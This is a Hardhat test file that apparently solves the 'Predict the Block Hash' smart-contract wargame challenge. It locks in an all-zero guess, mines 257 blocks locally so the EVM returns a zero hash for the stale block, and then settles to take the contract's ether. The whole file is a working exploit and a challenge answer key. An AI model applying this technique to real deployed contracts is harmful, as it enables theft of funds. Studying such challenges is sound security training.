import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    //Lock in our 'guess'
    const myGuessTx = await target.lockInGuess("0x0000000000000000000000000000000000000000000000000000000000000000",
      {value: utils.parseEther('1'),});
    const receipt = await myGuessTx.wait();
    //Wait for 256 blocks to be mined after myGuessTx.blockNumber+1
    for(let i=0; i <= 256; i++){
      await provider.send("evm_mine", []);
    }
    const attackTx = await target.settle();
    await attackTx.wait();
    expect(await target.isComplete()).to.equal(true);
  });
});
